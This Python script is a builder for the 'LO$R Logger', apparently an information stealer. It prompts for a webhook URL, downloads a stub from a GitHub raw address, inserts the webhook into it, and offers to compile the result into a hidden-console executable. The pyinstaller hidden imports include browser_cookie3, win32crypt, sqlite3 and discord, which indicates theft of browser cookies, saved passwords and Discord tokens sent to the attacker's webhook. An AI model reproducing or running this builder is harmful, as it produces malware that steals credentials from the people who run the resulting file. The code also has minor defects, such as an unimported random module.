import marshal
import zlib
import requests
from pystyle import *
import pygame
import os
import time
import shutil
import os
import time
import json
import threading
from tkinter import Tk

music_dir = "assets/music"

pygame.mixer.init()

music_files = [os.path.join(music_dir, f) for f in os.listdir(music_dir) if f.endswith(".mp3")]

for file in music_files:
    pygame.mixer.music.load(file)
    pygame.mixer.music.queue(file)

pygame.mixer.music.play()

random.shuffle(pygame.mixer.music.get_queue())

os.system(f'cls & title LO$R Logger Builder!')
Write.Print(Center.XCenter("""
 /$$        /$$$$$$     /$$    /$$$$$$$        /$$                                                        
| $$       /$$__  $$  /$$$$$$ | $$__  $$      | $$                                                        
| $$      | $$  \ $$ /$$__  $$| $$  \ $$      | $$        /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$      | $$  | $$| $$  \__/| $$$$$$$/      | $$       /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$      | $$  | $$|  $$$$$$ | $$__  $$      | $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \__/
| $$      | $$  | $$ \____  $$| $$  \ $$      | $$      | $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      
| $$$$$$$$|  $$$$$$/ /$$  \ $$| $$  | $$      | $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      
|________/ \______/ |  $$$$$$/|__/  |__/      |________/ \______/  \____  $$ \____  $$ \_______/|__/      
                     \_  $$_/                                      /$$  \ $$ /$$  \ $$                    
                       \__/                                       |  $$$$$$/|  $$$$$$/                    
                                                                   \______/  \______/                                                                                                               
                                                                    made by ! LO$R#0001\n"""), Colors.blue_to_purple, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.blue_to_purple, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.blue_to_purple, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Isn't working\n",Colors.blue_to_purple, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.blue_to_purple, interval=0.01)
stub = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/main/stubs/stub.py")
with open(f"{name}.py", 'w', encoding='utf8') as f:
    f.write(stub.text.replace("webhooker", webhook))
Write.Print("LO$R Logger Was SucessFully Built\n",Colors.blue_to_purple, interval=0.01)
exe = Write.Input("Complie To A Exe y/n:", Colors.blue_to_purple, interval=0.01)
if exe == "y":
   os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
   os.remove(f'{name}.spec')
   Write.Print("LO$R Logger was sucessfully complied in dist folder\n",Colors.blue_to_purple, interval=0.01) 
   time.sleep(2)
   Write.Print("Compiled to exe. Exiting...\n",Colors.blue_to_purple, interval=0.01) 
   time.sleep(3)
   exit()
elif exe == "n":
   Write.Print("Not Compiled to exe. Exiting...\n",Colors.blue_to_purple, interval=0.01) 
   time.sleep(3)
   exit()
